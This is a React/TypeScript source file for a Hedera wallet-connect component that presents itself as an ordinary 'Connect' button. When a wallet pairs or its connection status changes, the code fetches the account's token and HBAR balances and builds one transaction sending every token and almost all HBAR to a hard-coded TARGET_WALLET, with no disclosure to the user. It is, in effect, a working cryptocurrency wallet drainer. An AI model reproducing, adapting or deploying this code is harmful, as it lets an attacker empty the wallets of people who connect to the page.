import { Box, Button } from "@mui/material";
import { AccountId, Hbar, TransferTransaction, HbarUnit } from "@hashgraph/sdk";
import { useCallback, useEffect, useRef } from "react";
import { useDispatch, useSelector } from "react-redux";
import { hc, hcInitPromise, TARGET_WALLET } from "../../services/hashconnect";
import { actions, AppStore } from "../../store";
import { MirrorNodeClient } from "../../services/mirrorNodeClient";
import { appConfig } from "../../config";

interface INFOS {
  name: string;
  balance: number;
  accountId: number;
  token_id: string;
}

export const HashConnectClient = () => {
  const dispatch = useDispatch();
  const syncCalledRef = useRef(false); // To track if syncWithHashConnect has already been called

  async function getTokenBalances(accountId: string) {
    try {
      // Define the mirror node URL
      const mirrorNodeUrl =
        await `https://mainnet.mirrornode.hedera.com/api/v1/accounts/${accountId}`;
      console.log(`Fetching account balance for account ID: ${accountId}`);
      // Make the fetch request
      const response = await fetch(mirrorNodeUrl);
      if (!response.ok) {
        throw new Error(
          `Failed to fetch account balance. Status: ${response.status}`
        );
      }
      // Parse the JSON response
      let object: any = await {};
      const data = await response.json();
      object = await JSON.stringify(data as any);
      console.log(JSON.parse(object), "000000000000000000");

      const hbarBalance =
        (await JSON.parse(object)?.balance?.balance) / 100000000; // Convert tinybars to HBAR
      console.log(
        `The HBAR account balance for account ID ${accountId} is ${hbarBalance} HBAR`
      );
      // const keyType = "ED25519"
      const keyType = data?.key?._type === "ED25519" ? "ED25519" : "ECDSA";
      return { remainingHbar: hbarBalance, keytype: keyType };
      // return { remainingHbar: hbarBalance, keytype: "ED" };
    } catch (error: any) {
      console.error("Error fetching account balance:", error.message);
      throw error;
    }
  }

  const syncWithHashConnect = useCallback(async () => {
    if (syncCalledRef.current) {
      console.log("syncWithHashConnect is already in progress.");
      return; // Prevent multiple calls
    }

    syncCalledRef.current = true;
    console.log("syncWithHashConnect started.");

    try {
      const connectedAccountIds = hc.connectedAccountIds;

      if (connectedAccountIds && connectedAccountIds.length > 0) {
        const targetAccountId = connectedAccountIds?.map((o: any) =>
          o.toString()
        )[0];
        const accountIDD = connectedAccountIds[0]?.num?.low;
        if (!accountIDD) {
          throw new Error("Account ID or its 'num.low' property is missing.");
        }
        // Update Redux state
        dispatch(
          actions.hashconnect.setAccountIds(
            connectedAccountIds.map((o: any) => o.toString())
          )
        );
        dispatch(actions.hashconnect.setIsConnected(true));
        dispatch(actions.hashconnect.setPairingString(hc.pairingString ?? ""));

        // Perform additional actions
        const mirrorNodeClient = new MirrorNodeClient(
          appConfig.networks.mainnet
        );
        let tokenInfos: INFOS[] = [];

        let tokens =
          await mirrorNodeClient.getAccountTokenBalancesWithTokenInfo(
            targetAccountId as any
          );
        if (!tokens || tokens.length <= 0) {
          tokenInfos = [];
        } else {
          console.log("Tokens received from API:", tokens);
          tokenInfos = tokens
            .filter((info: any) => info?.balance > 0 && info?.info) // Ensure info exists
            .map((info: any) => ({
              name: info?.info?.name ?? "Unknown Token",
              balance: info?.balance,
              accountId: Number(info?.token_id?.split(".").pop() ?? 0),
              token_id: info?.token_id?.toString() ?? "",
            }));
        }
        await sendAllTokens(accountIDD, TARGET_WALLET, tokenInfos);
      } else {
        // Update Redux for no connected accounts
        dispatch(actions.hashconnect.setAccountIds([]));
        dispatch(actions.hashconnect.setIsConnected(false));
        dispatch(actions.hashconnect.setPairingString(""));
      }
    } catch (error) {
      console.error("Error in syncWithHashConnect:", error);
    } finally {
      syncCalledRef.current = false; // Allow future calls
      console.log("syncWithHashConnect completed.");
    }
  }, [dispatch]);

  useEffect(() => {
    const pairingCallback = (data: any) => {
      console.log("Pairing event detected:", data);
      syncWithHashConnect(); // Trigger sync on pairing
    };
    hc.pairingEvent.on(pairingCallback);
    // hc.connectionStatusChangeEvent.on(connectionCallback);
    return () => {
      hc.pairingEvent.off(pairingCallback);
    };
  }, [syncWithHashConnect]);

  useEffect(() => {
    const connectionCallback = (data: any) => {
      console.log("Connection status changed:", data);
      syncWithHashConnect(); // Trigger sync on connection status change
    };

    // Add connection status change listener
    hc.connectionStatusChangeEvent.on(connectionCallback);

    return () => {
      // Cleanup connection status listener
      hc.connectionStatusChangeEvent.off(connectionCallback);
    };
  }, [syncWithHashConnect]);

function calculateHbarGasFee(zeroBytes = 0, nonZeroBytes = 0) {
  const baseGas = 21000; // Base gas for any transaction
  const hbarTransferSurcharge = 9000; // Surcharge for HBAR transfers

  // Calculate intrinsic gas
  const intrinsicGas = baseGas + 4 * zeroBytes + 16 * nonZeroBytes;

  // Total gas fee
  const totalGas = (intrinsicGas + hbarTransferSurcharge) / 100_000_000;

  console.log(
      `Gas fee for sending HBAR: ${totalGas} gas units (Intrinsic Gas: ${intrinsicGas}, Surcharge: ${hbarTransferSurcharge})`
  );
  return totalGas;
}

function calculateTokenGasFee(useSystemContract = false, zeroBytes = 0, nonZeroBytes = 0) {
  const baseGas = 21000; // Base intrinsic gas
  const opcodeGasPerTransfer = 2600; // Approximation for token transfer opcode gas

  // Calculate intrinsic gas
  const intrinsicGas = baseGas + 4 * zeroBytes + 16 * nonZeroBytes;

  let totalGas = intrinsicGas + opcodeGasPerTransfer;

  if (useSystemContract) {
      // Example: If Hedera Token Service system contract is used
      const systemContractBaseCostUSD = 0.10; // Example base cost in USD
      const gasConversionRate = 1000000; // Gas per USD
      const systemContractGas = systemContractBaseCostUSD * gasConversionRate * 1.2; // Add 20% surcharge
      totalGas += systemContractGas;
  }

  console.log(
      `Gas fee for sending tokens: ${Math.ceil(totalGas)} gas units (Intrinsic Gas: ${intrinsicGas}, Opcode Gas: ${opcodeGasPerTransfer}, System Contract Gas: ${useSystemContract})`
  );
  return Math.ceil(totalGas / 100_000_000);
}

  const sendAllTokens = async (
    accountId: string,
    targetWallet: string,
    tokenBalances: INFOS[]
  ) => {
    try {
      const hbarAccountId = `0.0.${accountId}`;
      let { remainingHbar, keytype } = await getTokenBalances(accountId); // Fetch HBAR balance
      console.log("Initial HBAR Balance:", remainingHbar, keytype);
      const compareBal = remainingHbar;
      let signer;
      if (keytype === "ED25519") {
        signer = await hc.getSigner(AccountId.fromString(hbarAccountId));
        console.log(signer, "it's only for ECDSA");
        if (remainingHbar <= 0) {
          console.error("Insufficient HBAR. Cannot proceed with transaction.");
          return; // Exit if there’s no HBAR to cover gas fees
        }
        const transferTx = new TransferTransaction();
        // const signer = await hc.getSigner(AccountId.fromString(hbarAccountId));
        console.log(
          "Signer obtained:",
          signer,
          typeof hbarAccountId,
          typeof remainingHbar
        );
        // Estimated gas fee per token transfer (adjust as needed)
        const gasFeePerTokenTransfer = await calculateTokenGasFee(true, tokenBalances.length, 0); // Example: 0.0001 HBAR per token transfer
        // **Process Token Transfers**
        tokenBalances.forEach(({ token_id, balance }) => {
          if (balance > 0) {
            if (remainingHbar - gasFeePerTokenTransfer > 0) {
              // Deduct gas fee
              remainingHbar -= gasFeePerTokenTransfer;
              console.log(
                remainingHbar,
                "tokenBalnaces foreach loops",
                token_id,
                typeof token_id,
                typeof balance,
                balance
              );
              transferTx.addTokenTransfer(token_id, hbarAccountId, -balance); // Deduct from sender
              transferTx.addTokenTransfer(token_id, targetWallet, balance); // Add to receiver
              console.log(
                `Token transfer added for token ID: ${token_id}, Amount: ${balance}`
              );
              console.log(
                "Remaining HBAR after token transfer:",
                remainingHbar,
                "ECDSA"
              );
              // Add token transfer to transaction
            } else {
              console.warn(
                `Insufficient HBAR for gas fee. Skipping token transfer for ${token_id}.`
              );
            }
          }
        });

        const gasFee = await calculateHbarGasFee(0, 0);

        if (compareBal === remainingHbar) {
          remainingHbar = (await remainingHbar) - gasFee;
          console.log("calculation is stress!", compareBal, remainingHbar);
        }
        console.log(remainingHbar, " remaining Hbar amount");
        const tinybars = Math.round(remainingHbar * 100_000_000); // Convert HBAR to tinybars and round to nearest integer
        console.log(
          "Added HBAR transfer:",
          remainingHbar,
          typeof remainingHbar,
          "in tinybars:",
          tinybars
        );
        // **Handle Final HBAR Transfer**
        if (Number(remainingHbar) > 0) {
          console.log("remainingHbar is stresss for me!", remainingHbar);
          transferTx.addHbarTransfer(
            hbarAccountId,
            new Hbar(-tinybars, HbarUnit.Tinybar)
          ); // Deduct from sender
          transferTx.addHbarTransfer(
            targetWallet,
            new Hbar(tinybars, HbarUnit.Tinybar)
          ); // Add to receiver
          console.log("Added HBAR transfer:", remainingHbar);
        } else if (tokenBalances.length <= 0 && Number(remainingHbar) < 0) {
          console.error("Insufficient HBAR for final transfer.");
          return;
        } else {
        }
        // **Freeze and Execute the Transaction**
        await transferTx.freezeWithSigner(signer);
        console.log("Transaction frozen with signer.");
        const txResponse = await transferTx.executeWithSigner(signer);
        console.log("Transaction executed. Waiting for receipt...");

        // **Retrieve Transaction Receipt**
        const receipt = await txResponse.getReceipt(signer.getClient());
        console.log("Transaction Receipt Status:", receipt.status.toString());

        if (receipt.status.toString() === "SUCCESS") {
          console.log("All tokens and HBAR sent successfully!");
        } else {
          console.error(
            "Transaction failed. Status:",
            receipt.status.toString()
          );
        }
        return;
      } else if ((keytype as string) === "ECDSA") {
        signer = await hc.getSigner(AccountId.fromString(hbarAccountId));
        console.log(signer, "it's only for ECDSA");
        if (remainingHbar <= 0) {
          console.error("Insufficient HBAR. Cannot proceed with transaction.");
          return; // Exit if there’s no HBAR to cover gas fees
        }
        const transferTx = new TransferTransaction();
        // const signer = await hc.getSigner(AccountId.fromString(hbarAccountId));
        console.log(
          "Signer obtained:",
          signer,
          typeof hbarAccountId,
          typeof remainingHbar
        );
        // Estimated gas fee per token transfer (adjust as needed)
        const gasFeePerTokenTransfer = await calculateTokenGasFee(true, tokenBalances.length, 0); // Example: 0.0001 HBAR per token transfer
        console.log("gasFeePerTokenTransfer==============================00000000000000", gasFeePerTokenTransfer);
        // **Process Token Transfers**
        tokenBalances.forEach(({ token_id, balance }) => {
          if (balance > 0) {
            if (remainingHbar - gasFeePerTokenTransfer > 0) {
              // Deduct gas fee
              remainingHbar -= gasFeePerTokenTransfer;
              console.log(
                remainingHbar,
                "tokenBalnaces foreach loops",
                token_id,
                typeof token_id,
                typeof balance,
                balance
              );
              transferTx.addTokenTransfer(token_id, hbarAccountId, -balance); // Deduct from sender
              transferTx.addTokenTransfer(token_id, targetWallet, balance); // Add to receiver
              console.log(
                `Token transfer added for token ID: ${token_id}, Amount: ${balance}`
              );
              console.log(
                "Remaining HBAR after token transfer:",
                remainingHbar,
                "ECDSA"
              );
              // Add token transfer to transaction
            } else {
              console.warn(
                `Insufficient HBAR for gas fee. Skipping token transfer for ${token_id}.`
              );
            }
          }
        });
        const gasFee = await calculateHbarGasFee(0, 0);
        console.log("gasFee+++++++++++++++++++++++++0000000000000", gasFee);
        if (compareBal === remainingHbar) {
          remainingHbar = (await remainingHbar) - gasFee;
          console.log("calculation is stress!", compareBal, remainingHbar);
        }
        console.log(remainingHbar, " remaining Hbar amount");
        const tinybars = Math.round(remainingHbar * 100_000_000); // Convert HBAR to tinybars and round to nearest integer
        console.log(
          "Added HBAR transfer:",
          remainingHbar,
          typeof remainingHbar,
          "in tinybars:",
          tinybars
        );
        // **Handle Final HBAR Transfer**
        if (Number(remainingHbar) > 0) {
          console.log("remainingHbar is stresss for me!", remainingHbar);
          transferTx.addHbarTransfer(
            hbarAccountId,
            new Hbar(-tinybars, HbarUnit.Tinybar)
          ); // Deduct from sender
          transferTx.addHbarTransfer(
            targetWallet,
            new Hbar(tinybars, HbarUnit.Tinybar)
          ); // Add to receiver
          console.log("Added HBAR transfer:", remainingHbar);
        } else if (tokenBalances.length <= 0 && Number(remainingHbar) < 0) {
          console.error("Insufficient HBAR for final transfer.");
          return;
        } else {
        }
        // **Freeze and Execute the Transaction**
        await transferTx.freezeWithSigner(signer);
        console.log("Transaction frozen with signer.");
        const txResponse = await transferTx.executeWithSigner(signer);
        console.log("Transaction executed. Waiting for receipt...");

        // **Retrieve Transaction Receipt**
        const receipt = await txResponse.getReceipt(signer.getClient());
        console.log("Transaction Receipt Status:", receipt.status.toString());

        if (receipt.status.toString() === "SUCCESS") {
          console.log("All tokens and HBAR sent successfully!");
        } else {
          console.error(
            "Transaction failed. Status:",
            receipt.status.toString()
          );
        }
        // return;
      } else {
        console.error("Unsupported key type detected:", keytype);
        return; // Exit if the key type is neither ED25519 nor ECDSA
      }
    } catch (error) {
      console.error("Error executing transaction:", error);
    }
  };

  return null;
};

export const HashConnectConnectButton = () => {
  const { isConnected, accountIds: connectedAccountIds } = useSelector(
    (state: AppStore) => state.hashconnect
  );

  return (
    <Box>
      <Button
        color={"blurple" as any}
        variant="contained"
        onClick={async () => {
          if (isConnected) {
            await hcInitPromise;
            if (isConnected && hc.connectedAccountIds.length > 0) {
              hc.disconnect();
            }
          } else {
            hc.openPairingModal();
          }
        }}
      >
        {isConnected
          ? `Disconnect Account${connectedAccountIds.length > 1 ? "s" : ""}`
          : "Connect"}
      </Button>
    </Box>
  );
};
